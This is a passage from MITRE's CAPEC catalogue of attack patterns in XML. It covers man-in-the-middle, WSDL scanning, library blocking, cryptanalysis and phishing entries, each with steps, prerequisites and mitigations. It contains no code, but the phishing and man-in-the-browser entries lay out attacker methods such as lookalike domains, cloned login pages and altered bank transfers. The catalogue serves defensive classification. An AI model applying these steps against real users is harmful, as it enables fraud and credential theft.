               <Phase>Experiment</Phase>
               <Description>The attacker inserts himself into the communication channel initially acting as a routing proxy between the two targeted components. The attacker may or may not have to use cryptography.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>The attacker observes, filters or alters passed data of its choosing to gain access to sensitive information or to manipulate the actions of the two target components for his own purposes.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>There are two components communicating with each other.</Prerequisite>
            <Prerequisite>An attacker is able to identify the nature and mechanism of communication between the two target components.</Prerequisite>
            <Prerequisite>An attacker can eavesdrop on the communication between the target components.</Prerequisite>
            <Prerequisite>Strong mutual authentication is not used between the two target components yielding opportunity for attacker interposition.</Prerequisite>
            <Prerequisite>The communication occurs in clear (not encrypted) or with insufficient and spoofable encryption.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">This attack can get sophisticated since the attack may use cryptography.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Get your Public Key signed by a Certificate Authority</Mitigation>
            <Mitigation>Encrypt your communication using cryptography (SSL,...)</Mitigation>
            <Mitigation>Use Strong mutual authentication to always fully authenticate both ends of any communications channel.</Mitigation>
            <Mitigation>Exchange public keys using a secure channel</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Leveraging security vulnerabilities and inherent functionality within web browsers, an adversary may be able to execute a "Man in the Browser" (MITB) attack. The initial compromise of this attack is generally a Trojan delivered to a victim's system via phishing attacks, drive-by malware installations, or malicious browser extensions. Once the Trojan is on the victim system, the adversary can observe and intercept traffic such as cookies, HTTP sessions, and SSL client certificate, which may allow for browser pivoting into an authenticated session. MITB attacks also circumvent common security mechanisms such as two and three factor authentication, as well as SSL/PKI.</xhtml:p>
               <xhtml:p>For example, after installing a Trojan, an adversary positions himself between the victim and their banking institution. The victim begins by initiating a funds transfer from their personal savings to their personal checking account. Using injected JavaScript, the adversary captures this request and modifies it to transfer an increased amount of funds to an account that he controls, before sending it to the bank. The bank processes the transfer and sends the confirmation notice back to the victim, which is instead intercepted by the adversary. The adversary modifies the confirmation to reflect the original transaction details and sends this modified message back to the victim. Upon receiving the confirmation, the victim assumes the transfer was successful and is unaware that their money has just been transferred to the adversary.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="300"/>
            <Related_Weakness CWE_ID="290"/>
            <Related_Weakness CWE_ID="593"/>
            <Related_Weakness CWE_ID="287"/>
            <Related_Weakness CWE_ID="294"/>
            <Related_Weakness CWE_ID="724"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1090</Entry_ID>
               <Entry_Name>Connection Proxy</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1185</Entry_ID>
               <Entry_Name>Man in the Browser</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-553"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Examples-Instances, Related_Vulnerabilities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Example_Instances, Related_Attack_Patterns, Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="95" Name="WSDL Scanning" Abstraction="Detailed" Status="Draft">
         <Description>This attack targets the WSDL interface made available by a web service. The attacker may scan the WSDL interface to reveal sensitive information about invocation patterns, underlying technology implementations and associated vulnerabilities. This type of probing is carried out to perform more serious attacks (e.g. parameter tampering, malicious content injection, command injection, etc.). WSDL files provide detailed information about the services ports and bindings available to consumers. For instance, the attacker can submit special characters or malicious content to the Web service and can cause a denial of service condition or illegal access to database records. In addition, the attacker may try to guess other private methods by using the information provided in the WSDL files.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="54"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>The first step is exploratory meaning the attacker scans for WSDL documents. The WDSL document written in XML is like a handbook on how to communicate with the web services provided by the target host. It provides an open view of the application (function details, purpose, functional break down, entry points, message types, etc.). This is very useful information for the attacker.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>The second step that an attacker would undertake is to analyze the WSDL files and try to find potential weaknesses by sending messages matching the pattern described in the WSDL file. The attacker could run through all of the operations with different message request patterns until a breach is identified.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>Once an attacker finds a potential weakness, they can craft malicious content to be sent to the system. For instance the attacker may try to submit special characters and observe how the system reacts to an invalid request. The message sent by the attacker may not be XML validated and cause unexpected behavior.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>A client program connecting to a web service can read the WSDL to determine what functions are available on the server.</Prerequisite>
            <Prerequisite>The target host exposes vulnerable functions within its WSDL interface.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">This attack can be as simple as reading WSDL and starting sending invalid request.</Skill>
            <Skill Level="Medium">This attack can be used to perform more sophisticated attacks (SQL injection, etc.)</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>It is important to protect WSDL file or provide limited access to it.</Mitigation>
            <Mitigation>Review the functions exposed by the WSDL interface (especially if you have used a tool to generate it). Make sure that none of them is vulnerable to injection.</Mitigation>
            <Mitigation>Ensure the WSDL does not expose functions and APIs that were not intended to be exposed.</Mitigation>
            <Mitigation>Pay attention to the function naming convention (within the WSDL interface). Easy to guess function name may be an entry point for attack.</Mitigation>
            <Mitigation>Validate the received messages against the WSDL Schema. Incomplete solution.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>A WSDL interface may expose a function vulnerable to SQL Injection.</Example>
            <Example>
               <xhtml:p>The Web Services Description Language (WSDL) allows a web service to advertise its capabilities by describing operations and parameters needed to access the service. As discussed in step 5 of this series, WSDL is often generated automatically, using utilities such as Java2WSDL, which takes a class or interface and builds a WSDL file in which interface methods are exposed as web services.</xhtml:p>
               <xhtml:p>Because WSDL generation often is automated, enterprising adversaries can use WSDL to gain insight into the both public and private services. For example, an organization converting legacy application functionality to a web services framework may inadvertently pass interfaces not intended for public consumption to a WSDL generation tool. The result will be SOAP interfaces that give access to private methods.</xhtml:p>
               <xhtml:p>Another, more subtle WSDL attack occurs when an enterprising attacker uses naming conventions to guess the names of unpublished methods that may be available on the server. For example, a service that offers a stock quote and trading service may publish query methods such as requestStockQuote in its WSDL. However, similar unpublished methods may be available on the server but not listed in the WSDL, such as executeStockQuote. A persistent adversary with time and a library of words and phrases can cycle thru common naming conventions (get, set, update, modify, and so on) to discover unpublished application programming interfaces that open doors into private data and functionality.</xhtml:p>
               <xhtml:p>Source : "Seven Steps to XML Mastery, Step 7: Ensure XML Security", Frank Coyle. See reference section.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="538"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-554"/>
            <Reference External_Reference_ID="REF-555" Section="Step 7: Ensure XML Security"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="96" Name="Block Access to Libraries" Abstraction="Detailed" Status="Draft">
         <Description>An application typically makes calls to functions that are a part of libraries external to the application. These libraries may be part of the operating system or they may be third party libraries. It is possible that the application does not handle situations properly where access to these libraries has been blocked. Depending on the error handling within the application, blocked access to libraries may leave the system in an insecure state that could be leveraged by an attacker.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="603"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>Determine what external libraries the application accesses.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>Block access to the external libraries accessed by the application.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>Monitor the behavior of the system to see if it goes into an insecure/inconsistent state.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Experiment</Phase>
               <Description>If the system does go into an insecure/inconsistent state, leverage that to obtain information about the system functionality or data, elevate access control, etc. The rest of this attack will depend on the context and the desired goal.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>An application requires access to external libraries.</Prerequisite>
            <Prerequisite>An attacker has the privileges to block application access to external libraries.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Knowledge of how to block access to libraries, as well as knowledge of how to leverage the resulting state of the application based on the failed call.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Alter Execution Logic</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Ensure that application handles situations where access to APIs in external libraries is not available securely. If the application cannot continue its execution safely it should fail in a consistent and secure fashion.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>A web-based system uses a third party cryptographic random number generation library that derives entropy from machine's hardware. This library is used in generation of user session ids used by the application. If the library is inaccessible, the application instead uses a software based weak pseudo random number generation library. An attacker of the system blocks access of the application to the third party cryptographic random number generation library (by renaming it). The application in turn uses the weak pseudo random number generation library to generate session ids that are predictable. An attacker then leverages this weakness to guess a session id of another user to perform a horizontal elevation of privilege escalation and gain access to another user's account.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="589"/>
            <Related_Weakness CWE_ID="227"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="97" Name="Cryptanalysis" Abstraction="Standard" Status="Draft">
         <Description>Cryptanalysis is a process of finding weaknesses in cryptographic algorithms and using these weaknesses to decipher the ciphertext without knowing the secret key (instance deduction). Sometimes the weakness is not in the cryptographic algorithm itself, but rather in how it is applied that makes cryptanalysis successful. An attacker may have other goals as well, such as: Total Break (finding the secret key), Global Deduction (finding a functionally equivalent algorithm for encryption and decryption that does not require knowledge of the secret key), Information Deduction (gaining some information about plaintexts or ciphertexts that was not previously known) and Distinguishing Algorithm (the attacker has the ability to distinguish the output of the encryption (ciphertext) from a random permutation of bits).</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="192"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="20"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>An attacker discovers a weakness in the cryptographic algorithm or a weakness in how it was applied to a particular chunk of plaintext.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>An attacker leverages the discovered weakness to decrypt, partially decrypt or infer some information about the contents of the encrypted message. All of that is done without knowing the secret key.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target software utilizes some sort of cryptographic algorithm.</Prerequisite>
            <Prerequisite>An underlying weaknesses exists either in the cryptographic algorithm used or in the way that it was applied to a particular chunk of plaintext.</Prerequisite>
            <Prerequisite>The encryption algorithm is known to the attacker.</Prerequisite>
            <Prerequisite>An attacker has access to the ciphertext.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Cryptanalysis generally requires a very significant level of understanding of mathematics and computation.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Computing resource requirements will vary based on the complexity of a given cryptanalysis technique. Access to the encryption/decryption routines of the algorithm is also required.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>In most cases, if cryptanalysis is successful at all, an adversary will not be able to decrypt the entire message, but instead will only be able to deduce some information about the plaintext. However, that may be sufficient for an adversary, depending on the context of the attack.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use proven cryptographic algorithms with recommended key sizes.</Mitigation>
            <Mitigation>
               <xhtml:p>Ensure that the algorithms are used properly. That means:</xhtml:p>
               <xhtml:div style="margin-left:10px;">
                  <xhtml:ul>
                     <xhtml:li>1. Not rolling out your own crypto; Use proven algorithms and implementations.</xhtml:li>
                     <xhtml:li>2. Choosing initialization vectors with sufficiently random numbers</xhtml:li>
                     <xhtml:li>3. Generating key material using good sources of randomness and avoiding known weak keys</xhtml:li>
                     <xhtml:li>4. Using proven protocols and their implementations.</xhtml:li>
                     <xhtml:li>5. Picking the most appropriate cryptographic algorithm for your usage context and data</xhtml:li>
                  </xhtml:ul>
               </xhtml:div>
            </Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>A very easy to understand example is a cryptanalysis technique called frequency analysis that can be successfully applied to the very basic classic encryption algorithms that performed mono-alphabetic substitution replacing each letter in the plaintext with its predetermined mapping letter from the same alphabet. This was considered an improvement over a more basic technique that would simply shift all of the letters of the plaintext by some constant number of positions and replace the original letters with the new letter with the resultant alphabet position. While mono-alphabetic substitution ciphers are resilient to blind brute force, they can be broken easily with nothing more than a pen and paper. Frequency analysis uses the fact that natural language is not random and mono-alphabetic substitution does not hide the statistical properties of the natural language. So if the letter "E" in an English language occurs with a certain known frequency (about 12.7%), whatever "E" was substituted with to get to the ciphertext, will occur with the similar frequency. Having this frequency information allows the cryptanalyst to quickly determine the substitutions and decipher the ciphertext. Frequency analysis techniques are not applicable to modern ciphers as they are all resilient to it (unless this is a very bad case of a homegrown encryption algorithm). This example is inapplicable to modern cryptographic ciphers but is here to illustrate a rudimentary example of cryptanalysis.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="327"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-556" Section="Cryptanalysis"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Description, Description Summary, Examples-Instances, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="98" Name="Phishing" Abstraction="Standard" Status="Draft">
         <Description>Phishing is a social engineering technique where an attacker masquerades as a legitimate entity with which the victim might do business in order to prompt the user to reveal some confidential information (very frequently authentication credentials) that can later be used by an attacker. Phishing is essentially a form of information gathering or "fishing" for information.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="151">
               <Exclude_Related Exclude_ID="512"/>
               <Exclude_Related Exclude_ID="513"/>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="89"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="543"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="611"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="630"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="631"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="632"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the attacker impersonate the legitimate site more convincingly. The attacker can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.</Description>
               <Technique>Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L)</Technique>
               <Technique>Optionally obtain a legitimate SSL certificate for the new domain name.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>[Explore legitimate website and create duplicate] An attacker creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that he or she is trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.</Description>
               <Technique>Use spidering software to get copy of web pages on legitimate site.</Technique>
               <Technique>Manually save copies of required web pages from legitimate site.</Technique>
               <Technique>Create new web pages that have the legitimate site's look at feel, but contain completely new content.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Convince user to enter sensitive information on attacker's site.] An attacker sends an e-mail to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to attacker's website) and log in. The key is to get the victim to believe that the e-mail is coming from a legitimate entity with which the victim does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.</Description>
               <Technique>Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.</Technique>
               <Technique>Place phishing link in post to online forum.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Use stolen credentials to log into legitimate site] Once the attacker captures some sensitive information through phishing (login credentials, credit card information, etc.) the attacker can leverage this information. For instance, the attacker can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.</Description>
               <Technique>Log in to the legitimate site using another user's supplied credentials</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>An attacker needs to have a way to initiate contact with the victim. Typically that will happen through e-mail.</Prerequisite>
            <Prerequisite>An attacker needs to correctly guess the entity with which the victim does business and impersonate it. Most of the time phishers just use the most popular banks/services and send out their "hooks" to many potential victims.</Prerequisite>
            <Prerequisite>An attacker needs to have a sufficiently compelling call to action to prompt the user to take action.</Prerequisite>
            <Prerequisite>The replicated website needs to look extremely similar to the original website and the URL used to get to that website needs to look like the real URL of the said business entity.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Basic knowledge about websites: obtaining them, designing and implementing them, etc.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Some web development tools to put up a fake website.</Resource>
         </Resources_Required>
         <Indicators>
            <Indicator>You receive an e-mail from an entity that you are not even a customer of prompting you to log into your account.</Indicator>
            <Indicator>You receive any e-mail that provides you with a link which takes you to a website on which you need to enter your log in information.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Do not follow any links that you receive within your e-mails and certainly do not input any login credentials on the page that they take you too. Instead, call your Bank, PayPal, eBay, etc., and inquire about the problem. A safe practice would also be to type the URL of your bank in the browser directly and only then log in. Also, never reply to any e-mails that ask you to provide sensitive information of any kind.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>John gets an official looking e-mail from his bank stating that his or her account has been temporarily locked due to suspected unauthorized activity and that John needs to click on the link included in the e-mail to log in to his bank account in order to unlock it. The link in the e-mail looks very similar to that of his bank and once the link is clicked, the log in page is the exact replica. John supplies his login credentials after which he is notified that his account has now been unlocked and that everything is fine. An attacker has just collected John's online banking information which can now be used by him or her to log into John's bank account and transfer John's money to a bank account of the attackers' choice.</Example>
         </Example_Instances>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
   </Attack_Patterns>
   <Categories>
      <Category ID="118" Name="Collect and Analyze Information" Status="Stable">
         <Summary>Attack patterns within this category focus on the gathering, collection, and theft of information by an adversary. The adversary may collect this information through a variety of methods including active querying as well as passive observation. By exploiting weaknesses in the design or configuration of the target and its communications, an adversary is able to get the target to reveal more information than intended. Information retrieved may aid the adversary in making inferences about potential weaknesses, vulnerabilities, or techniques that assist the adversary's objectives. This information may include details regarding the configuration or capabilities of the target, clues as to the timing or nature of activities, or otherwise sensitive information. Often this sort of attack is undertaken in preparation for some other type of attack, although the collection of information by itself may in some cases be the end goal of the adversary.</Summary>
         <Relationships>
            <Has_Member CAPEC_ID="116"/>
            <Has_Member CAPEC_ID="117"/>
            <Has_Member CAPEC_ID="169"/>
            <Has_Member CAPEC_ID="224"/>
            <Has_Member CAPEC_ID="188"/>
            <Has_Member CAPEC_ID="192"/>
            <Has_Member CAPEC_ID="410"/>
         </Relationships>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-01-09">Gather Information</Previous_Entry_Name>
         </Content_History>
      </Category>
      <Category ID="152" Name="Inject Unexpected Items" Status="Stable">
         <Summary>Attack patterns within this category focus on the ability to control or disrupt the behavior of a target either through crafted data submitted via an interface for data input, or the installation and execution of malicious code on the target system. The former happens when an adversary adds material to their input that is interpreted by the application causing the targeted application to perform steps unintended by the application manager or causing the application to enter an unstable state. Attacks of this type differ from Data Structure Attacks in that the latter attacks subvert the underlying structures that hold user-provided data, either pre-empting interpretation of the input (in the case of Buffer Overflows) or resulting in values that the targeted application is unable to handle correctly (in the case of Integer Overflows). In Injection attacks, the input is interpreted by the application, but the attacker has included instructions to the interpreting functions that the target application then follows.</Summary>
         <Relationships>
            <Has_Member CAPEC_ID="137"/>
            <Has_Member CAPEC_ID="175"/>
            <Has_Member CAPEC_ID="240"/>
            <Has_Member CAPEC_ID="242"/>
            <Has_Member CAPEC_ID="248"/>
            <Has_Member CAPEC_ID="549"/>
            <Has_Member CAPEC_ID="624"/>
            <Has_Member CAPEC_ID="594"/>
            <Has_Member CAPEC_ID="586"/>
         </Relationships>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Description, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-01-09">Injection</Previous_Entry_Name>
         </Content_History>
      </Category>
      <Category ID="156" Name="Engage in Deceptive Interactions" Status="Stable">
         <Summary>Attack patterns within this category focus on malicious interactions with a target in an attempt to deceive the target and convince the target that it is interacting with some other principal and as such take actions based on the level of trust that exists between the target and the other principal. These types of attacks assume that some piece of content or functionality is associated with an identity and that the content / functionality is trusted by the target because of this association. Often identified by the term "spoofing", these types of attacks rely on the falsification of the content and/or identity in such a way that the target will incorrectly trust the legitimacy of the content. For example, an attacker may modify a financial transaction between two parties so that the participants remain unchanged but the amount of the transaction is increased. If the recipient cannot detect the change, they may incorrectly assume the modified message originated with the original sender. Attacks of these type may involve an adversary crafting the content from scratch or capturing and modifying legitimate content.</Summary>
         <Relationships>
            <Has_Member CAPEC_ID="148"/>
            <Has_Member CAPEC_ID="151"/>
            <Has_Member CAPEC_ID="154"/>
            <Has_Member CAPEC_ID="173"/>
            <Has_Member CAPEC_ID="416"/>
         </Relationships>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
